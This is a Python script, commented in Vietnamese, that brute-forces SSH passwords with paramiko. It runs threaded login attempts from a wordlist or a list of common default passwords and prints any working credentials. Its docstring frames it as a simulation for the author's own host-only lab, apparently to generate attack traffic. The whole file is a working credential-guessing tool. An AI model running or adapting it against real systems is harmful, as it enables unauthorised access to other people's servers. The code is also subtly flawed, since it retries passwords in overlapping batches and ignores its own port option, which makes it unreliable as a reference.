#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ssh_bruteforce.py — Giả lập Brute Force SSH từ Windows vào SSH server trên Kali.

Cần: pip install paramiko
Chỉ dùng trong LAB host-only của chính bạn.

Ví dụ:
    python ssh_bruteforce.py --target 192.168.56.20 --user ubuntu --wordlist pass.txt
    python ssh_bruteforce.py --target 192.168.56.20 --user ubuntu --passwords pass1,pass2,123456
"""
import argparse
import sys
import threading
import time
from pathlib import Path

try:
    import paramiko
except ImportError:
    print("Cần cài: pip install paramiko")
    sys.exit(1)


def try_password(target, user, pwd, results, lock, timeout=4.0):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(target, username=user, password=pwd, timeout=timeout,
                       allow_agent=False, look_for_keys=False)
        with lock:
            results.append((pwd, True))
            print(f"    [HIT] {user}:{pwd}")
    except Exception:
        with lock:
            results.append((pwd, False))
    finally:
        client.close()


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", required=True)
    ap.add_argument("--port", type=int, default=22)
    ap.add_argument("--user", default="ubuntu")
    ap.add_argument("--wordlist", default=None, help="File wordlist (1 mật khẩu/dòng)")
    ap.add_argument("--passwords", default="123456,password,root,toor,ubuntu,kali,admin")
    ap.add_argument("--threads", type=int, default=4, help="Số luồng song song (nhỏ để tạo nhiều flow)")
    ap.add_argument("--delay", type=float, default=0.1, help="Nghỉ giữa các lần thử (giây)")
    args = ap.parse_args()

    if args.wordlist:
        wl = Path(args.wordlist)
        if not wl.exists():
            print("Không thấy wordlist:", wl)
            return 1
        passwords = [l.strip() for l in wl.read_text(encoding="utf-8", errors="ignore").splitlines()
                     if l.strip()]
    else:
        passwords = [p.strip() for p in args.passwords.split(",") if p.strip()]

    print(f"[brute] SSH {args.user}@{args.target}:{args.port} với {len(passwords)} mật khẩu")
    results: list = []
    lock = threading.Lock()
    paramiko.SSHClient  # noqa: B018 (giữ import rõ ràng)
    for i, pwd in enumerate(passwords):
        threads = []
        for pwd_i in passwords[i:i + args.threads]:
            t = threading.Thread(target=try_password,
                                 args=(args.target, args.user, pwd_i, results, lock))
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
        time.sleep(args.delay)
        if any(ok for _, ok in results):
            break
    hits = [pwd for pwd, ok in results if ok]
    print(f"[brute] Xong. Thử {len(results)} mật khẩu, thành công: {len(hits)}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
